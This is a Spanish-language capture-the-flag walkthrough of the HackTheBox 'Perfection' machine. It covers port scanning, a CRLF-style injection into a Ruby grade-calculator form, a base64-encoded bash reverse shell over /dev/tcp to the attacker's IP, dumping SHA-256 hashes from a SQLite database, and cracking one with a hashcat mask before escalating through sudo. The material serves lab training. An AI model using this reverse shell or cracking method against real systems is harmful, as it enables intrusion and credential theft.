---
title:  "Perfection - HTB"
header:
  teaser:
categories: 
  - CTFs
tags:
  - HTB
---

La máquina **Perfection** se encuentra en la plataforma [HackTheBox](https://www.hackthebox.com/) y está clasificada como de nivel fácil. Tiene una web vulnerable a RCE que deberemos explotar usando una inyección CRLF. Para escalar privilegios, tendremos que encontrar el hash de la contraseña del usuario y descifrarlo.

## Reconocimiento

Comienzo verificando que la máquina se encuentra activa lanzándole un ping. Recibiendo una respuesta sé que la máquina se encuentra activa. También puedo saber que estoy ante un sistema Linux, ya que tiene 63 de TTL.

```shell
ping -c 1 10.10.11.253   

PING 10.10.11.253 (10.10.11.253) 56(84) bytes of data.
64 bytes from 10.10.11.253: icmp_seq=1 ttl=63 time=51.1 ms

--- 10.10.11.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 51.129/51.129/51.129/0.000 ms
```

El siguiente paso es hacer un escaneo nmap para descubrir que puertos de la máquina se encuentran abiertos. Uso los siguientes parámetros:

- -p-: Escanear todos los puertos (65535).
- –open: Mostrar solo los puertos abiertos.
- -sS: Realiza un TCP SYN Scan para escanear rápidamente qué puertos están abiertos.
- –min-rate 5000: Indica que el escaneo no vaya más lento que 5000 paquetes por segundo.
- -vvv: El modo verbose muestra la información según se va encontrando.
- -n: No realizar resolución de DNS. Así evitamos que el escaneo dure más tiempo del necesario.
- -Pn: Deshabilitar el descubrimiento de host mediante ping.
- -oG: Exportar el resultado a un fichero en una sola línea para que podamos usar comandos como: grep, awk, sed, etc. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.253 -oG allports                                                                                                                             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 09:50 EDT
Initiating SYN Stealth Scan at 09:50
Scanning 10.10.11.253 [65535 ports]
Discovered open port 22/tcp on 10.10.11.253
Discovered open port 80/tcp on 10.10.11.253
Completed SYN Stealth Scan at 09:50, 14.82s elapsed (65535 total ports)
Nmap scan report for 10.10.11.253
Host is up, received user-set (0.064s latency).
Scanned at 2024-04-23 09:50:10 EDT for 15s
Not shown: 62884 closed tcp ports (reset), 2649 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
           Raw packets sent: 73535 (3.236MB) | Rcvd: 63259 (2.530MB)
```

El escaneo detecta dos puertos abiertos:

- 22 (SSH)
- 80 (HTTP)

A continuación, lanzo otro nmap para analizar los servicios y versiones de los dos puertos encontrados. Los comandos usados son:

- -sCV: Detectar el servicio y aplicar scripts básicos de reconocimiento.
- -p: Indicar los puertos a escanear.
- -oN: Exportar el resultado a un archivo.

```shell
nmap -sCV -p22,80 10.10.11.253 -oN target                                                                                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 09:57 EDT
Nmap scan report for 10.10.11.253
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
```

El escaneo no ha reportado nada interesante. Según el título, la web parece ser una calculadora de notas. Antes de acceder a ella, la analizo con whatweb para ver más información sobre las tecnologías que utiliza. 

```shell
whatweb http://10.10.11.253                                         

http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

También realizaré un fuzzing con gobuster para enumerar directorios y archivos. Utilizo los parámetros:

- -w: Para indicar un diccionario.
- -t 20: Emplear 20 hilos.
- -x html,php,txt,js: Especificar que haga fuzzing por html, php, txt y js.

```shell
gobuster dir -u http://10.10.11.253 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20 -x html,php,txt,js                                  

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.253
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3827]
Progress: 12461 / 438325 (2.84%)[ERROR] Get "http://10.10.11.253/opportunities.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/opportunities.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/foot": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/foot.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/foot.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/foot.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/foot.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/property.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/property.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/drunk": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/drunk.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/property.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.10.11.253/drunk.js": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 438320 / 438325 (100.00%)
===============================================================
Finished
===============================================================
```

## Análisis de vulnerabilidades

Entro a la web y veo una sección con una tabla para introducir calificaciones. 

![Perfection 1](/assets/images/2024-05-18-Perfection/perfection_2.png)

Al tratar de inyectar comandos o XSS, la página muestra un mensaje de aviso.

![Perfection 2](/assets/images/2024-05-18-Perfection/perfection_1.png)

Con Burpsuite intercepto la petición para manipular los datos que se envían.

![Perfection 3](/assets/images/2024-05-18-Perfection/perfection_3.png)

Tras hacer varias pruebas, intento realizar un CRLF Injection. Inyecto un payload donde se compruebe si 1 es igual 1. ``

>La inyección CRLF consiste en añadir caracteres CR (retorno de carro) y LF (avance de línea) en la entrada de los datos. Esta acción induce a error al servidor, la aplicación o el usuario haciéndoles interpretar la secuencia inyectada como el final de una respuesta y el comienzo de otra.

![Perfection 4](/assets/images/2024-05-18-Perfection/perfection_4.png)

Compruebo como se ha ejecutado correctamente y se ha mostrado un "true" en la web.

![Perfection 5](/assets/images/2024-05-18-Perfection/perfection_5.png)

## Explotación de vulnerabilidades

Habiendo conseguido ejecutar el payload anterior, el siguiente paso es inyectar comandos para establecer una reverse shell.

Codificamos la reverse shell en base64 y hacemos un URL encode al carácter "+" para que no se interprete como un espacio.

```shell
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.175/4321 0>&1"' | base64 | sed 's/\+/\%2b/'
```

Nos ponemos en escucha con netcat en el puerto indicado y ejecutamos el payload con el base64.

![Perfection 6](/assets/images/2024-05-18-Perfection/perfection_6.png)

Comprobamos que se ha establecido la conexión.

```shell
nc -nlvp 4321                                                           
listening on [any] 4321 ...
connect to [10.10.14.175] from (UNKNOWN) [10.10.11.253] 52358
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ pwd
pwd
/home/susan/ruby_app
susan@perfection:~/ruby_app$ whoami
whoami
susan
susan@perfection:~/ruby_app$
```

## Escalada de privilegios

Para tener una consola interactiva y que por ejemplo detecte un ctrl.c hay que hacer un tratamiento de la tty. Ejecuto `script /dev/null -c bash`, hago ***ctrl+z***, , escribo ***"stty raw -echo; fg"***, introduzco ***"reset xterm"*** y doy un ***intro***. Con esto he reiniciado la configuración de la terminal.

La shell todavía no es interactiva del todo. Podemos ver que la variable de entorno $TERM tiene el valor dump y no xterm. Podemos arreglar esto de la siguiente forma. 

```shell
susan@perfection:~/ruby_app$ echo $TERM
dumb
susan@perfection:~/ruby_app$ export TERM=xterm
```

La proporción de la consola no es correcta comparada con la terminal de mi kali. Miro el tamaño con `stty size`.

```shell
susan@perfection:~/ruby_app$ stty size
24 80
```

En la máquina Perfection hay 24 filas y 80 columnas, pero en mi kali son 63 filas y 281 columnas. Las modifico para que tengan el mismo espacio.

```shell
susan@perfection:~/ruby_app$ stty rows 63 columns 281
```

A continuación, comienzo a rootear la máquina. Primero reviso el UID, GID y grupos del usuario susan. Veo como se encuentra dentro del grupo sudo.

```shell
susan@perfection:~/ruby_app$ id                      
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

Moviéndome de directorio, encuentro la primera flag del reto.

```shell
susan@perfection:~/ruby_app$ cd .. 
cd ..
susan@perfection:~$ ls
ls
Migration
ruby_app
user.txt
susan@perfection:~$ cat user.txt
cat user.txt
2e1*************************cd4
susan@perfection:~$
```

En la carpeta "Migration" hay una base de datos con contraseñas, pero se encuentran hasheadas.

```shell
susan@perfection:~/Migration$ ls                               
pupilpath_credentials.db
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite> .exit
```

Ejecuto el "linpeas" que hay.

```shell
susan@perfection:~$ ls              
cd  linpeas.sh  Migration  ruby_app  user.txt
susan@perfection:~$ ./linpeas.sh
```

Encuentra un archivo llamado "susan" que puedo leer.

```shell
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root susan 625 May 14  2023 /var/mail/susan        
-rw-r----- 1 root susan 33 Apr 26 15:16 /home/susan/user.txt
```

En su contenido, se indica en base a que reglas está creada la contraseña del usuario susan. 

```shell
susan@perfection:~$ cat /var/mail/susan      
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Antes encontré la contraseña de sussan hasheada en una base de datos. La guardo en un archivo.

```shell
cat hash abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

Para romperla, usaré hashcat.

```shell
hashcat -m 1400 hash -a 3 "susan_nasus_?d?d?d?d?d?d?d?d?d"
```

Al finalizar, obtengo la contraseña de susan. 

```shell
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Fri Apr 26 16:40:33 2024 (2 mins, 52 secs)
Time.Estimated...: Fri Apr 26 16:43:25 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1887.6 kH/s (0.28ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324558848/1000000000 (32.46%)
Rejected.........: 0/324558848 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_803824210
Hardware.Mon.#1..: Util: 33%
```

Como ya vi antes, el usuario se encuentra dentro del grupo sudo, por lo que puedo ejecutar `sudo su` para ser root. 

```shell
susan@perfection:~$ sudo su
[sudo] password for susan: 
root@perfection:/home/susan# cd /root/
root@perfection:~# ls
root.txt
root@perfection:~# cat root.txt 
e2***********************40
```
